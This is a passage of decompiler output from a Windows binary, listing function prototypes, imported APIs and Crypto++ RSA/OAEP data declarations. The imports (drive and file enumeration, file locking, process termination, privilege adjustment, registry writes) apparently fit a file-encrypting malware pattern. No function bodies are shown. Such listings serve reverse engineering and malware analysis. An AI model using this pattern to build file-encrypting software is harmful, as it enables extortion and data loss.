// int __thiscall unknown_libname_72(_DWORD); weak
// _DWORD __stdcall unknown_libname_73(_DWORD); weak
char __thiscall sub_452E1C(_DWORD *this, int a2, char a3);
// int __thiscall unknown_libname_74(_DWORD); weak
char __thiscall sub_452FDA(_DWORD *this);
char __thiscall sub_452FF9(_DWORD *this);
// int __thiscall unknown_libname_75(_DWORD); weak
// int __thiscall unknown_libname_76(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_77(_DWORD); weak
// int __stdcall __crt_stdio_output::string_output_adapter<char>::write_string(void *Src, int, int, int); idb
char *__cdecl sub_453837(void *Block, unsigned int a2, unsigned int a3);
int __cdecl sub_453C3D(int a1);
// int __cdecl unknown_libname_78(void *Block); idb
void *__cdecl sub_454160(void **a1);
void *__cdecl sub_45417B(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_454274(int a1, int a2);
int __cdecl sub_45429C(int a1, int a2);
int __cdecl sub_454525(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4545B9();
char sub_4545E5();
__vcrt_bool sub_45462A();
int sub_4546CE();
int __cdecl sub_4546D4(int a1);
int __cdecl sub_4546FC(int a1);
int __cdecl sub_454862(_DWORD *a1);
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_454A1A(int a1, int a2);
void __thiscall sub_454A42(_DWORD *this);
__int32 sub_454C02();
int sub_455B11();
// int __cdecl _set_new_mode(int NewMode);
int *sub_455B46();
// int __cdecl __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(struct __crt_locale_pointers *, int, int, int, char); idb
int __cdecl sub_456E66(int a1);
// void __cdecl _free_base(void *Block);
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_457048(int a1, int a2);
int __cdecl sub_457070(int a1, int a2);
int __cdecl sub_457098(int a1, int a2);
int __cdecl sub_4570C0(int a1, int a2);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_457A9B(int a1, int a2);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_45843B(int a1, int a2);
int __cdecl sub_458463(int a1);
// void *__cdecl _calloc_base(size_t Count, size_t Size);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_458840(int a1, int a2);
// size_t __cdecl _msize(void *Block);
struct __crt_locale_data *__cdecl sub_45A6CC(int a1, struct __crt_locale_data **a2);
void *__cdecl sub_45A6F9(int a1, void **a2);
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_45AE2A(int a1, int a2);
// void *__cdecl _realloc_base(void *Block, size_t Size);
int sub_45C935();
int __thiscall sub_45E184(_DWORD **this, void *Block);
// int unknown_libname_86(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_45E28E(int a1, int a2);
// int __acrt_update_thread_multibyte_data(void); weak
char sub_45EB2B();
// int __acrt_update_thread_locale_data(void); weak
int __cdecl sub_465904(double a1);
// int __cdecl _ceil_default(double); idb
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
int __stdcall sub_4659EE(int a1, char *a2, int a3);
int __stdcall sub_465A5E(int a1, char *a2, int a3);
char *__thiscall sub_465BBC(char *Block, char a2);
void __thiscall sub_465F6F(void *Block);
_DWORD *__cdecl sub_46604A(_DWORD *a1);
_DWORD *__cdecl sub_4660CA(_DWORD *a1);
int __stdcall sub_46614A(int a1);
// void __cdecl `anonymous namespace'::_PopulateCppExceptionRecord(_anonymous_namespace_ *__hidden this, struct _EXCEPTION_RECORD *, const void *const, const struct _s_ThrowInfo *); idb
// void __cdecl __ExceptionPtrCopy(void *, const void *); idb
// void __cdecl __ExceptionPtrCreate(void *); idb
// void __cdecl __ExceptionPtrCurrentException(void *); idb
// void __cdecl __ExceptionPtrDestroy(void *Block); idb
void __cdecl sub_469E32(); // idb
void __cdecl nullsub_1(); // idb
void __cdecl sub_469E42(); // idb
void __cdecl sub_469E4D(); // idb
void __cdecl sub_469E57(); // idb
void __cdecl sub_469E61(); // idb
void __cdecl sub_469E6D(); // idb
void __cdecl sub_469E9C(); // idb
void __cdecl sub_469EA7(); // idb
void __cdecl sub_469EB1(); // idb
void __cdecl sub_469EBB(); // idb
void __cdecl sub_469EC7(); // idb
void __cdecl sub_469ED6(); // idb
void __cdecl sub_469EE1(); // idb
void __cdecl sub_469EF0(); // idb
void __cdecl sub_469EFB(); // idb
void __cdecl nullsub_2(); // idb
void __cdecl sub_469F0B(); // idb
void __cdecl nullsub_3(); // idb
void __cdecl sub_469F17(); // idb
void __cdecl sub_469F26(); // idb
void __cdecl sub_469F31(); // idb
void __cdecl sub_469F49(); // idb
void __cdecl sub_469F61(); // idb
void __cdecl sub_469F70(); // idb
void __cdecl sub_469F7B(); // idb
void __cdecl sub_469F8A(); // idb
void __cdecl sub_469F99(); // idb
void __cdecl sub_469FA4(); // idb
void __cdecl sub_469FB3(); // idb
void __cdecl sub_469FBE(); // idb
void __cdecl sub_469FC8(); // idb
void __cdecl sub_469FD7(); // idb
void __cdecl sub_469FE2(); // idb
void __cdecl sub_469FF1(); // idb
void __cdecl sub_469FFC(); // idb
void __cdecl sub_46A00B(); // idb
void __cdecl sub_46A01A(); // idb
void __cdecl sub_46A025(); // idb
void __cdecl sub_46A034(); // idb
void __cdecl sub_46A03F(); // idb
void __cdecl sub_46A04E(); // idb
void __cdecl sub_46A059(); // idb
void __cdecl sub_46A068(); // idb
void __cdecl sub_46A073(); // idb
void __cdecl sub_46A082(); // idb
void __cdecl sub_46A091(); // idb
void __cdecl sub_46A09C(); // idb
void __cdecl sub_46A0AB(); // idb
void __cdecl sub_46A0BA(); // idb
void __cdecl sub_46A0C5(); // idb
void __cdecl sub_46A0D4(); // idb
void __cdecl sub_46A0DF(); // idb
void __cdecl sub_46A0EE(); // idb
void __cdecl sub_46A0F9(); // idb
void __cdecl sub_46A108(); // idb
void __cdecl sub_46A113(); // idb
void __cdecl sub_46A122(); // idb
void __cdecl sub_46A12D(); // idb
void __cdecl sub_46A13C(); // idb
void __cdecl sub_46A147(); // idb
void __cdecl sub_46A156(); // idb
void __cdecl sub_46A161(); // idb
void __cdecl sub_46A170(); // idb
void __cdecl sub_46A17B(); // idb
void __cdecl sub_46A185(); // idb
void __cdecl sub_46A18F(); // idb
void __cdecl sub_46A199(); // idb
void __cdecl sub_46A1A3(); // idb
void __cdecl sub_46A1AD(); // idb
void __cdecl sub_46A1B7(); // idb
void __cdecl sub_46A1C1(); // idb
void __cdecl sub_46A1CB(); // idb
void __cdecl sub_46A1D5(); // idb
void __cdecl sub_46A1DF(); // idb
void __cdecl sub_46A1E9(); // idb
void __cdecl sub_46A1F3(); // idb
void __cdecl sub_46A1FD(); // idb
void __cdecl sub_46A207(); // idb
void __cdecl sub_46A211(); // idb
// int __stdcall GetModuleBaseNameA(_DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegCreateKeyW)(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern HANDLE (__stdcall *FindFirstFileExW)(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *GetVersionExW)(LPOSVERSIONINFOW lpVersionInformation);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// extern BOOL (__stdcall *LockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh);
// extern BOOL (__stdcall *UnlockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToUnlockLow, DWORD nNumberOfBytesToUnlockHigh);
// extern BOOL (__stdcall *GetThreadTimes)(HANDLE hThread, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern BOOL (__stdcall *QueryPerformanceFrequency)(LARGE_INTEGER *lpFrequency);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *TryEnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *InitializeCriticalSectionAndSpinCount)(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// extern DWORD (__stdcall *TlsAlloc)();
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern void (__stdcall *OutputDebugStringW)(LPCWSTR lpOutputString);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern HANDLE (__stdcall *CreateTimerQueue)();
// extern DWORD (__stdcall *SignalObjectAndWait)(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern int (__stdcall *GetThreadPriority)(HANDLE hThread);
// extern BOOL (__stdcall *GetLogicalProcessorInformation)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, PDWORD ReturnedLength);
// extern BOOL (__stdcall *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
// extern BOOL (__stdcall *ChangeTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
// extern BOOL (__stdcall *DeleteTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent);
// extern BOOL (__stdcall *GetNumaHighestNodeNumber)(PULONG HighestNodeNumber);
// extern BOOL (__stdcall *GetProcessAffinityMask)(HANDLE hProcess, PDWORD_PTR lpProcessAffinityMask, PDWORD_PTR lpSystemAffinityMask);
// extern DWORD_PTR (__stdcall *SetThreadAffinityMask)(HANDLE hThread, DWORD_PTR dwThreadAffinityMask);
// extern BOOL (__stdcall *RegisterWaitForSingleObject)(PHANDLE phNewWaitObject, HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context, ULONG dwMilliseconds, ULONG dwFlags);
// extern BOOL (__stdcall *UnregisterWait)(HANDLE WaitHandle);
// extern void (__stdcall __noreturn *FreeLibraryAndExitThread)(HMODULE hLibModule, DWORD dwExitCode);
// extern HMODULE (__stdcall *LoadLibraryExW)(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern PSLIST_ENTRY (__stdcall *InterlockedPopEntrySList)(PSLIST_HEADER ListHead);
// extern PSLIST_ENTRY (__stdcall *InterlockedPushEntrySList)(PSLIST_HEADER ListHead, PSLIST_ENTRY ListEntry);
// extern PSLIST_ENTRY (__stdcall *InterlockedFlushSList)(PSLIST_HEADER ListHead);
// extern USHORT (__stdcall *QueryDepthSList)(PSLIST_HEADER ListHead);
// extern BOOL (__stdcall *UnregisterWaitEx)(HANDLE WaitHandle, HANDLE CompletionEvent);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern LPWSTR (__stdcall *PathAddBackslashW)(LPWSTR pszPath);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
void *CryptoPP::NameValuePairs::`vftable' = &sub_403955; // weak
void *std::exception::`vftable' = &unknown_libname_2; // weak
void *CryptoPP::Exception::`vftable' = &sub_40635D; // weak
void *CryptoPP::InvalidArgument::`vftable' = &sub_40635D; // weak
void *CryptoPP::NotImplemented::`vftable' = &sub_40635D; // weak
void *CryptoPP::BERDecodeErr::`vftable' = &sub_40AD76; // weak
void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable' = &sub_40635D; // weak
void *CryptoPP::ByteQueue::Walker::`vftable' = &sub_40ADFB; // weak
void *CryptoPP::ByteQueue::Walker::`vftable' = &sub_40AD6E; // weak
void *CryptoPP::OID::`vftable' = &sub_40ADD3; // weak
void *CryptoPP::BERGeneralDecoder::`vftable' = &sub_40AD95; // weak
void *CryptoPP::BERGeneralDecoder::`vftable' = &sub_40AD5E; // weak
void *CryptoPP::DERGeneralEncoder::`vftable' = &sub_40ADB4; // weak
void *CryptoPP::DERGeneralEncoder::`vftable' = &sub_40AD66; // weak
void *CryptoPP::BERSequenceDecoder::`vftable' = &sub_40AD95; // weak
void *CryptoPP::BERSequenceDecoder::`vftable' = &sub_40AD5E; // weak
void *CryptoPP::DERSequenceEncoder::`vftable' = &sub_40ADB4; // weak
void *CryptoPP::DERSequenceEncoder::`vftable' = &sub_40AD66; // weak
int dword_46B8F0[128] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307
}; // weak
void *CryptoPP::CRC32::`vftable' = &sub_40BD87; // weak
void *CryptoPP::FilterPutSpaceHelper::`vftable' = &sub_40C1B3; // weak
void *CryptoPP::HashFilter::`vftable' = &sub_40C1DB; // weak
void *CryptoPP::HashFilter::`vftable' = &loc_40C17C; // weak
void *CryptoPP::HashFilter::`vftable' = &loc_40C184; // weak
void *CryptoPP::ArraySink::`vftable' = &loc_40C18C; // weak
void *CryptoPP::ArraySink::`vftable' = &sub_40C174; // weak
void *CryptoPP::ArrayXorSink::`vftable' = &loc_40C18C; // weak
void *CryptoPP::ArrayXorSink::`vftable' = &sub_40C174; // weak
void *CryptoPP::InvalidDataFormat::`vftable' = &sub_40635D; // weak
void *CryptoPP::InvalidCiphertext::`vftable' = &sub_40AD76; // weak
void *CryptoPP::CannotFlush::`vftable' = &sub_40635D; // weak
void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable' = &sub_4065CF; // weak
void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable' = &sub_40AD76; // weak
void *CryptoPP::InvalidKeyLength::`vftable' = &sub_40AD76; // weak
void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable' = &sub_40635D; // weak
void *CryptoPP::AlgorithmParametersBase::`vftable' = &sub_406C56; // weak
void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable' = &sub_408F8A; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable' = &sub_408F5E; // weak
void *CryptoPP::SelfTestFailure::`vftable' = &sub_40AD76; // weak
_UNKNOWN unk_46C65C; // weak
void *CryptoPP::ClassNullRNG::`vftable' = &sub_40CDE0; // weak
void *CryptoPP::PK_DefaultEncryptionFilter::`vftable' = &sub_40CDFA; // weak
void *CryptoPP::PK_DefaultEncryptionFilter::`vftable' = &loc_40CDBE; // weak
__m128i stru_46C990 = { { -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0 } }; // weak
int dword_46C9A0[9] = { 2, 2, 2, 4, 4, 8, 8, 8, 8 }; // weak
void *std::runtime_error::`vftable' = &unknown_libname_2; // weak
void *std::bad_cast::`vftable' = &unknown_libname_2; // weak
void *std::_Facet_base::`vftable' = &sub_40312F; // weak
void *std::ctype<char>::`vftable' = &sub_4034BF; // weak
void *std::_System_error::`vftable' = &unknown_libname_7; // weak
void *std::system_error::`vftable' = &unknown_libname_7; // weak
void *std::ios_base::failure::`vftable' = &unknown_libname_7; // weak
void *CryptoPP::Integer::DivideByZero::`vftable' = &sub_40AD76; // weak
void *CryptoPP::Integer::`vftable' = &sub_40F0BC; // weak
void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable' = &sub_40BD87; // weak
void *CryptoPP::ModularArithmetic::`vftable' = &sub_40F0DE; // weak
void *CryptoPP::MontgomeryRepresentation::`vftable' = &sub_40F0FD; // weak
void *CryptoPP::StringStore::`vftable' = &sub_406E6D; // weak
void *CryptoPP::StringStore::`vftable' = &sub_409E95; // weak
void *CryptoPP::SHA1::`vftable' = &sub_408F2E; // weak
void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable' = &sub_40F092; // weak
char aValuenames[11] = "ValueNames"; // weak
void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable' = &sub_40635D; // weak
void *CryptoPP::P1363_MGF1::`vftable' = &unknown_libname_18; // weak
void *CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable' = &unknown_libname_18; // weak
void *CryptoPP::X509PublicKey::`vftable' = &sub_407167; // weak
void *CryptoPP::X509PublicKey::`vftable' = &sub_409E8D; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_408EBE; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_409EB5; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_409E9D; // weak
